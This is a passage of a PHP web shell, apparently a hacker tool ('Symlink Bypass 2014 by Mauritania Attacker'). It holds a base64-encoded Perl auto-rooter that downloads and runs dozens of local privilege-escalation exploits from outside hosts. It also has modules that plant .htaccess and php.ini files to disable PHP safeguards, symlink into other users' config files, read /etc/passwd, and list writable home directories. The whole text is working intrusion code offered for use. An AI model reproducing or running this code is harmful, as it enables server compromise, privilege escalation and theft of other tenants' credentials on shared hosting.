Jvb3QvMi42LjktNTUtMjAwOC1wcnY4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiLi8yLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNjcyMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjktNjcyMDA4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS4yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS4yIik7DQpzeXN0ZW0oIi4vMi42LjkuMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45MS0yMDA3Iik7DQpzeXN0ZW0oIi4vMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMDciKTsNCnN5c3RlbSgiLi8yMDA3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LWxvY2FsIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LWxvY2FsIik7DQpzeXN0ZW0oIi4vMjAwOS1sb2NhbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMDktd3VuZGVyYmFyIik7DQpzeXN0ZW0oIi4vMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMSIpOw0Kc3lzdGVtKCIuLzIxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzIik7DQpzeXN0ZW0oIi4vMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMy40LjYtOS0yMDA3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAzLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiLi8zLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzMxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzMSIpOw0Kc3lzdGVtKCIuLzMxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zNi1yYzEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDM2LXJjMSIpOw0Kc3lzdGVtKCIuLzM2LXJjMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOw0Kc3lzdGVtKCIuLzQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzQ0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOw0Kc3lzdGVtKCIuLzQ0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDciKTsNCnN5c3RlbSgiLi80NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNSIpOw0Kc3lzdGVtKCIuLzUiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzUwIik7DQpzeXN0ZW0oImNobW9kIDc3NyA1MCIpOw0Kc3lzdGVtKCIuLzUwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTQiKTsNCnN5c3RlbSgiLi81NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNiIpOw0Kc3lzdGVtKCIuLzYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzY3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA2NyIpOw0Kc3lzdGVtKCIuLzY3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3Iik7DQpzeXN0ZW0oIi4vNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNy0yIik7DQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsNCnN5c3RlbSgiLi83LTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290Lzd4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3eCIpOw0Kc3lzdGVtKCIuLzd4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC84Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA4Iik7DQpzeXN0ZW0oIi4vOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvOSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOSIpOw0Kc3lzdGVtKCIuLzkiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzkwIik7DQpzeXN0ZW0oImNobW9kIDc3NyA5MCIpOw0Kc3lzdGVtKCIuLzkwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTQiKTsNCnN5c3RlbSgiLi85NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvTGludXhfMi42LjEyIik7DQpzeXN0ZW0oImNobW9kIDc3NyBMaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiLi9MaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L0xpbnV4XzIuNi45LWpvb2x5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgTGludXhfMi42Ljktam9vbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2FjaWQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGFjaWQiKTsNCnN5c3RlbSgiLi9hY2lkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9kM3ZpbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZDN2aWwiKTsNCnN5c3RlbSgiLi9kM3ZpbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMSIpOw0Kc3lzdGVtKCIuL2V4cDEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDIiKTsNCnN5c3RlbSgiLi9leHAyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9leHAzIik7DQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7DQpzeXN0ZW0oIi4vZXhwMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwbG9pdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdCIpOw0Kc3lzdGVtKCIuL2V4cGxvaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmdWxsLW5lbHNvbiIpOw0Kc3lzdGVtKCIuL2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9nYXlyb3MiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGdheXJvcyIpOw0Kc3lzdGVtKCIuL2dheXJvcyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvbGVuaXMuc2giKTsNCnN5c3RlbSgiY2htb2QgNzc3IGxlbmlzLnNoIik7DQpzeXN0ZW0oIi4vbGVuaXMuc2giKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLTIuNi45LTIwMDUtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oIi4vbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oImNobW9kIDc3NyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oIi4vbG9jYWwtcm9vdC1leHBsb2l0LWdheXJvcyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcHJpdjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHByaXY0Iik7DQpzeXN0ZW0oIi4vcHJpdjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3B3bmtlcm5lbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcHdua2VybmVsIik7DQpzeXN0ZW0oIi4vcHdua2VybmVsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9yb290LnB5Iik7DQpzeXN0ZW0oImNobW9kIDc3NyByb290LnB5Iik7DQpzeXN0ZW0oIi4vcm9vdC5weSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcnVueCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVueCIpOw0Kc3lzdGVtKCIuL3J1bngiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Rpdm9saSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdGl2b2xpIik7DQpzeXN0ZW0oIi4vdGl2b2xpIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC91YnVudHUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHVidW50dSIpOw0Kc3lzdGVtKCIuL3VidW50dSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9hLnBvbWYuc2UvdHhmZmd2LnppcCIpOw0Kc3lzdGVtKCJ1bnppcCB0eGZmZ3YuemlwIik7DQpzeXN0ZW0oImNobW9kICt4IHRyb2xsZWQiKTsNCnN5c3RlbSgiLi90cm9sbGVkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oImNobW9kICt4IDNfWCIpOw0Kc3lzdGVtKCIuLzNfWCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0KDQoNCnByaW50ICJFbmQgTGludXguLiBbK11cbiI7DQp9DQppZiAoJEFSR1ZbMF0gPX4gImJzZCIgKQ0Kew0KcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7DQpwcmludCAiIyBMaW51eC9Cc2QvU3Vub3MgQVVUTy1ST09URVIgICNcbiI7DQpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICAgSGF2ZSBhIGNvZmZlICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyAgICAgICBSb290aW5nIEJTRCAgICAgICAgICAgICNcbiI7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnN5c3RlbSgidW5hbWUgLWE7bWtkaXIgYnNkO2NkIGJzZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2EucG9tZi5zZS9qd2dvYm4uemlwIik7DQpzeXN0ZW0oInVuemlwIGp3Z29ibi56aXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDQ4bG9jYWwiKTsNCnN5c3RlbSgiLi80OGxvY2FsIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgiY2htb2QgNzc3IGJzZGxvY2FsIik7DQpzeXN0ZW0oIi4vYnNkbG9jYWwiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJjaG1vZCA3NzcgQlNEMy42X2xvY2Fscm9vdCIpOw0Kc3lzdGVtKCIuL0JTRDMuNl9sb2NhbHJvb3QiKTsNCnN5c3RlbSgiaWQiKTsNCg0KDQoNCg0KcHJpbnQgIkVuZCBCc2QuLiBbK11cbiI7DQp9DQppZiAoJEFSR1ZbMF0gPX4gInN1bm9zIiApDQp7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgIFJvb3RpbmcgU3Vub3MgICAgICAgICAgI1xuIjsNCnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0Kc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBzdW5vcztjZCBzdW5vcyIpOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9hLnBvbWYuc2Uva2twZ3ZzLnppcCIpOw0Kc3lzdGVtKCJ1bnppcCBra3BndnMuemlwIik7DQpzeXN0ZW0oImNobW9kIDc3NyB4X29zaC5wbCAiKTsNCnN5c3RlbSgicGVybCB4X29zaC5wbCAiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC9TdW5PUyUyMDUuOS9zdW5vczU5Iik7DQpzeXN0ZW0oImNobW9kIDc3NyBzdW5vczU5Iik7DQpzeXN0ZW0oIi4vc3Vub3M1OSIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290L1N1bk9TJTIwNS44L2ZpbmFsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmaW5hbCIpOw0Kc3lzdGVtKCIuL2ZpbmFsIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvU3VuT1MlMjA1Ljcvc29sYXJpczI3Iik7DQpzeXN0ZW0oImNobW9kICt4IHNvbGFyaXMyNyIpOw0Kc3lzdGVtKCIuL3NvbGFyaXMyNyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290L1N1bk9TJTIwNS4xMC9zdW5vczUxMCIpOw0Kc3lzdGVtKCJjaG1vZCAreCBzdW5vczUxMCIpOw0Kc3lzdGVtKCIuL3N1bm9zNTEwIik7DQpzeXN0ZW0oImlkIik7DQoNCg0KcHJpbnQgIkVuZCBTdW5PUyAuLlsrXVxuIjsNCn0=';
$chmoderr = fopen("lulZ/autoroot.pl" ,"w+");
$write = fwrite ($chmoderr ,base64_decode($shellw0rm));
if($write){
echo '<p>Script Autoroot is here ===> '.getcwd().'/lulZ/autoroot.pl</p>';
fclose($chmoderr);
chmod("lulZ/autoroot.pl",0755);


//Extracting htaccess to enable perl handler and type all depends on the server :D
$htaccess = 'T3B0aW9ucyBJbmNsdWRlcyBJbmNsdWRlc05PRVhFQyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KDQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtY2dpIC5wbA0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAucGwNCg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbA0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbA==';
$lol = fopen("lulZ/.htaccess" ,"w+");
$dwrite = fwrite ($lol ,base64_decode($htaccess));
fclose($chmoderr);

echo '<p>Back Connect and go to this directory ====> cd '.getcwd().'/lulZ/</p>';
echo "<p>Autoroot Command : perl autoroot.pl</p>";

}
}

} elseif($_GET['do'] == 'masy') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Symlink Manual</span><center><br>';
echo'<br><form method="post">
<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
<input type="text" name="symfile" value="file name symlink .txt" size="60"/><br /><br />
<input type="submit" value="symlink" name="symlink" /> <br /><br />
</form>';

$pfile = $_POST['file'];
$symfile = $_POST['symfile'];
$symlink = $_POST['symlink'];

if ($symlink)
{
@mkdir('simfel',0777);
$c  = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n  AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n Require None \n Satisfy Any";
$f =@fopen ('simfel/.htaccess','w');
@fwrite($f , $c);
@symlink("$pfile","simfel/$symfile");
echo '<br /><font face="Tahoma" color="#ff6000" size="3pt"><b>Done.. !</b><br></font><div class="cont" align="center"><font face="Tahoma" color="#ff6000" size="2pt">Open this file -> <a target="_blank" href="simfel/'.$symfile.'" >'.$symfile.'</a></font></div>';
}
}

} elseif($_GET['do'] == 'manu') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Manually Retrieve Config</span><center><br>';
echo "<input type='submit'  value='Copy & Symlink' /><br><br>
<select name='switch'>
<option selected='selected' value='file'>View file</option><option value='dir'>View dir</option><input type='text' size='60' name='string'><input type='submit' value='go'>
</select><br><br>";
function red(){
  
$string = !empty($_POST['string']) ? $_POST['string'] : 0;
$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;

if ($string && $switch == "file") {
$stream = imap_open($string, "", "");
if ($stream == FALSE)
die("Can't open imap stream");

$str = imap_body($stream, 1);
if (!empty($str))
echo "<pre>".$str."</pre>";
imap_close($stream);
} elseif ($string && $switch == "dir") {
$stream = imap_open("/etc/passwd", "", "");
if ($stream == FALSE)
die("Can't open imap stream");

$string = explode("|",$string);
if (count($string) > 1)
$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
else
$dir_list = imap_list($stream, trim($string[0]), "*");
echo "<pre>";
for ($i = 0; $i < count($dir_list); $i++)
echo "$dir_list[$i]\n";
echo "</pre>";
imap_close($stream);
}
}
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<br><b><font face:Tahoma, Geneva, sans-serif; color="#ff0000" size="3pt">Sorry, This function does not work on Windows platforms.</b></font><br>';

}else

{
$slash="/";
$basep=str_replace("\\","/",$basep);
}
$s=$_SERVER['PHP_SELF'];

echo '<br><form method=post action="'.$s.'">
<p align="center">
SymLink With PHP<br><input type=text name=mrc1 size=50><br> <br><input type=text value="'.getcwd().$slash."symlink.txt".'" name=mrc2 

size=50><br><br><input type=submit value=Submit><p align="center"></form>
<form method=post action="'.$s.'"><p align="center"><br>

SymLink With OS : <br><input type=text name=mrci1 size=50><br> <br><input type=text value="'.getcwd().$slash."symlink.txt".'" name=mrci2 

size=50><br><br><input type=submit value=Submit>
</p></form><br>';
if ($_POST['mrc1'] && $_POST['mrc2']){
if (symlink($_POST['mrc1'],$_POST['mrc2'])){
echo "<script>alert('Symlink Worked')</script>";
}else{
echo "<script>alert('Symlink Not Worked')</script>";
}}
if ($_POST['mrci1'] && $_POST['mrci2']){
if (system('ls -s '.$_POST['mrci1']." ".$_POST['mrci2'])){
echo "<script>alert('Symlink Worked')</script>";
}else{echo "<script>alert('Symlink Didn't Work')</script>";
}}
}

} elseif($_GET['do'] == 'ensim') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Enable Symlink If Disabled</span><center><br>';
echo '<br><center><form method=post><br><br>
<input type=submit name=ens value="Bypass" /></form></center>';
          
error_reporting(0);
            
if(isset($_POST['ens']))
{
mkdir('ensim',0755);
$rr  ='<Directory "/">
Options All
Options +FollowSymLinks
Options +SymLinksIfOwnerMatch
Options +ExecCGI
AllowOverride AuthConfig FileInfo Indexes Limit Options=Includes,Includes,Indexes,MultiViews,SymLinksIfOwnerMatch
</Directory>';
$g = fopen('ensim/.htaccess','w');
fwrite($g,$rr);
echo "<br><br><font face='Tahoma' color='#ff0000' size='2pt'>Symlink Function Enabled Successfully in apache pre main conf</font></center>";
} 
}
} elseif($_GET['do'] == 'sybas14') { ?>
<?
{
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Symlink Bypass 2014 by Mauritania Attacker</span><center><br>';
$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE ");
echo'<form method="post">
<input type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input type="text" name="ghostfile" value="output.txt" size="60"/><br /><br />
<input type="submit" value="Bypass" name="symlink" /> <br /><br />
</form>
';
echo '<div class="tul"><b>PHP VERSION:</b> <font color="009900" face="shell, Geneva, sans-serif" style="font-size: 8pt">';echo phpversion();

$fichier = $_POST['file'];
$ghostfile = $_POST['ghostfile'];
$symlink = $_POST['symlink'];

if ($symlink)
{


$dir = "mauritania";
if(file_exists($dir)) {
echo "<br><font color='red'>[+] mauritania Folder Already Exist °_° are you Drunk XD !!!</font><br />\n";
} else {
@mkdir($dir); {
echo "<br><font color='red'>\!/ mauritania Folder Created ^_^ \!/</font><br />\n";
echo "<br><font color='red'>\!/ $ghostfile Retrieved Successfully ^_^ \!/</font><br />\n";
} 
}

// Extract Priv8 htaccess File //					
$priv9  = "#Priv9 htaccess By Mauritania Attacker
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
DirectoryIndex $ghostfile
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
$f =@fopen ('mauritania/.htaccess','w');
@fwrite($f , $priv9);

@symlink("$fichier","mauritania/$ghostfile");

echo '<br /><a target="_blank" href="mauritania/" >'.$ghostfile.'</a>';
}
}

} elseif($_GET['do'] == 'cari') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Find Directory Writable/Readable</span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font color='#007700' size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=green>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#00dd00 size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found</font><font color=yellow 